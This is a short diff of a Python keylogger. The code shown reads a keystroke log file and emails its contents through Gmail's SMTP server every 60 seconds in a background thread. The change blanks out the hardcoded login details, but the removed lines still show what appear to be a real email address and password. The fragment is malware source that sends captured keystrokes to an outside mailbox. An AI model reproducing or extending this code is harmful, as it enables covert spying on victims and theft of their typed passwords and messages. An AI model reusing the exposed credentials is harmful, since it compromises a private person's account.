@@ -41,7 +41,7 @@ if __name__ == '__main__':
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
 file_log = 'C:\keyloggeroutput.txt'
-server.login("fariamatheus67@gmail.com", "12081439a")
+server.login("", "")
 
 # Thread to send email
 
@@ -51,7 +51,7 @@ def sendEmail(text):
             #Send Email
             filecontent = open('C:\keyloggeroutput.txt', 'r').read()
             msg = "\n" + str(filecontent) # The /n separates the message from the headers
-            server.sendmail("fariamatheus67@gmail.com", "fariamatheus67@gmail.com", msg)
+            server.sendmail("", "", msg)
         time.sleep(60)
 
 thread.start_new_thread(sendEmail, ('This is a simple Text', ))
